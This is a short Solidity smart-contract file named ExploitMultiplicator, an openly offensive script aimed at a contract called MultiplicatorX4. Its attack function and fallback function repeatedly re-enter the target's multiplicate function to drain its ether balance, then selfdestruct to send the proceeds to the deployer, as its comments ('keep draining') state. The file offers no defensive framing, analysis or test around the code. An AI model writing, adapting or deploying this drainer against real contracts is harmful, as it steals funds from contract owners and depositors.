pragma solidity ^0.4.18;

interface IMultiplicatorX4 {
    function multiplicate(address adr) external payable;
    function Command(address adr, bytes data) external payable;
}

contract ExploitMultiplicator {
    IMultiplicatorX4 public target;
    address public owner;

    constructor(address _target) public {
        target = IMultiplicatorX4(_target);
        owner = msg.sender;
    }

    // Reenter target and keep draining
    function attack() external payable {
        require(msg.value > 0);
        target.multiplicate.value(msg.value)(address(this));
    }

    // Fallback gets called during transfer; reenter
    function() public payable {
        if (address(target).balance >= msg.value) {
            target.multiplicate.value(msg.value)(address(this));
        } else {
            // Done draining, send to owner
            selfdestruct(owner);
        }
    }
}

